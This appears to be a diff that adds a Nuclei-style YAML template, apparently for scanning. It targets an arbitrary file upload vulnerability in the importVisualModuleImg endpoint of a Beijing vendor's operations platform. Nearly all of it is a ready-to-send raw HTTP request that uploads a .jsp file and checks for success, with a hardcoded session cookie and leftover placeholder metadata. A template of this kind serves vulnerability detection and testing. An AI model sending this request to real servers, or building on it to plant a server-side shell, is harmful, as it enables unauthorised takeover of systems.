@@ -1,0 +1,35 @@
+id: zkjw-importVisualModuleImg-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 北京中科聚网信息技术有限公司的一体化运营平台是一个综合性的信息系统，旨在为企业或机构提供全方位的运营支持和管理服务。北京中科聚网信息技术有限公司一体化运营平台importVisualModuleImg接口存在文件上传漏洞，攻击者可利用此漏洞上传任意文件获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91%E4%B8%80%E4%BD%93%E5%8C%96%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0importVisualModuleImg%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /manage/tplresource/importVisualModuleImg?moduleId=2 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Type: multipart/form-data; boundary=----9979a3f1-cdb1-43af-af88-a9b48b67cf71
+        Content-Length: 198
+        Cookie:  JSESSIONID=9438c497-92ad-4800-b821-20602adec4ac;rememberMe=dcOzuzCzFrtr02GhN9IwcsR9v759kvzO9wq/upEQ0jwsU5y/25kFW52CaKmZoRP7pwH979ifBBXB3b+li3PSXwZmxnh+bMgi6kv5vv8WNkNdy1pblj7sPxtwIm71auJPyyOl+aMKAhk/71leMQLpneRk/8f6USYL/acFuWhpjyuVU6oP6YJdIoCKGgdxAiUk:
+
+        ------9979a3f1-cdb1-43af-af88-a9b48b67cf71
+        Content-Disposition: form-data; name="file"; filename="tmp.jsp"
+        Content-Type: multipart/form-data
+
+        6666
+        ------9979a3f1-cdb1-43af-af88-a9b48b67cf71--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.jsp'
